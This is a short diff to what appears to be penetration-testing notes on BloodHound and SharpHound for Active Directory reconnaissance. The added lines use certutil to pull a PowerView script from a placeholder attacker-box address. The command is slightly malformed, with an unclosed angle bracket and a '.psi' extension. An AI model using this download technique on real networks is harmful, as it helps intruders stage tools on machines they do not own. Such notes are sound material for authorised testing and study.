@@ -740,6 +740,10 @@ Can be obtained using
 ```
 git clone https://github.com/BloodHoundAD/BloodHound.git
 ```
+sharphound component can be uploaded usual ways including certutil similar to this:
+```
+certutil -urlcache -f http://<Attackboxip:80/powerview.psi PowerView.ps1 
+```
 
 Run SharpHound (full collection)
 ```
